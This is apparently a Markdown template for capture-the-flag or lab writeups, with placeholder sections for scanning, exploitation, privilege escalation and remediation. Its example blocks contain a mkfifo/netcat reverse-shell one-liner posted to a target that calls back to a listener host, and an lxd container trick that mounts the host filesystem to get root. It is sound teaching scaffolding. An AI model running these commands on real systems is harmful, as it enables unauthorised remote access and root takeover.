---
Name: "Challenge or Room Name"
Category: "TryHackMe | DVWA | Security Summer School"
Difficulty: "Easy | Medium | Hard"
Description: "One or two sentences describing the target, techniques, and outcome covered by this writeup."
URL: "https://example.com/challenge"
---

# Overview
Provide a brief summary of the machine/challenge. Mention the target operating system, key concepts covered (e.g., SQL injection, buffer overflow, active directory exploitation), and your overall experience.

- **Target IP:** `10.10.x.x`
- **OS:** Linux / Windows
- **Difficulty:** Easy / Medium / Hard

---

# Enumeration
Document your initial reconnaissance steps. Include the commands run and key findings.

## Port Scanning (Nmap / Rustscan)
Scan for open ports and services:
```console
$ rustscan -a 10.10.x.x --ulimit 5000 -- -sC -sV
[Insert rustscan/nmap output here]
```

*Key Findings:*
- **Port 22:** SSH (OpenSSH 7.6p1)
- **Port 80:** HTTP (Apache 2.4.29)

## Web Reconnaissance
Explore the web service and enumerate directories/files:
```console
$ gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
[Insert gobuster/dirbuster output here]
```

*Key Findings:*
- `/secret-dir/` (Status: 200) containing an interesting file.

---

# Exploitation
Step-by-step documentation on how you gained initial access to the system.

## Vulnerability Identification
Explain the vulnerability found (e.g., LFI, RCE, default credentials).

## Getting a Shell
Detail the exploit payload or steps taken:
```console
$ curl -X POST http://10.10.x.x/exploit.php -d "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"
```
```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.x.x] 53212
whoami
www-data
```

---

# Privilege Escalation
How you escalated privileges from the initial user to root/administrator.

## Local Enumeration
Commands used to check for privilege escalation paths (e.g., `sudo -l`, SUID bits, internal services):
```console
$ sudo -l
Matching Defaults entries for www-data on gaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gaming:
    (root) NOPASSWD: /usr/bin/lxd
```

## Root Shell
Explain the step taken to get root:
```console
$ lxc init ubuntu:18.04 alpine -c security.privileged=true
$ lxc config device add alpine mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start alpine
$ lxc exec alpine sh
whoami
root
```

---

# Key Takeaways
- **Vulnerability:** Explain what went wrong (e.g., unauthenticated RCE).
- **Remediation:** How the administrator can fix this issue (e.g., upgrade packages, restrict sudo permissions).
